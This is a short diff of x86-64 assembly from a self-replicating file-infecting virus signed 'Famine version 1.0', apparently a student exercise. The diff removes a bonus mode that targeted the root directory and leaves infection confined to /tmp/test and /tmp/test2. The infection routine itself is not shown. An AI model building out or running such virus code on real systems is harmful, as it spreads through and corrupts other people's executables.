@@ -276,7 +276,6 @@ _start.run_as_virus:
     lea rdx, [rsp + 4104]       ; file list buffer
     call virus_list_and_infect
 
-%ifndef BONUS_MODE
     ; Also process /tmp/test2 directory
     lea rdi, [rsp + 8]          ; path buffer
     lea rsi, [r15 + v_secondDir - virus_start]  ; virus embedded string
@@ -287,7 +286,6 @@ _start.run_as_virus:
     lea rsi, [rsp]              ; file count pointer
     lea rdx, [rsp + 4104]       ; file list buffer
     call virus_list_and_infect
-%endif
 
     ; Restore to original stack frame
     mov rsp, rbp
@@ -329,14 +327,8 @@ _start.run_as_virus:
 ; ============================================
 ; Embedded virus strings (in code section for position independence)
 ; ============================================
-%ifdef BONUS_MODE
-v_firstDir:       db "/", 0
-%else
 v_firstDir:       db "/tmp/test", 0
-%endif
-%ifndef BONUS_MODE
 v_secondDir:      db "/tmp/test2", 0
-%endif
 v_signature:      db "Famine version 1.0 (c)oded by - <ocrossi>-<elaignel> - "
 v_signature_len:  equ $ - v_signature
 v_random_suffix:  times RANDOM_SUFFIX_LEN db 0  ; Stores generated random alphanumeric suffix
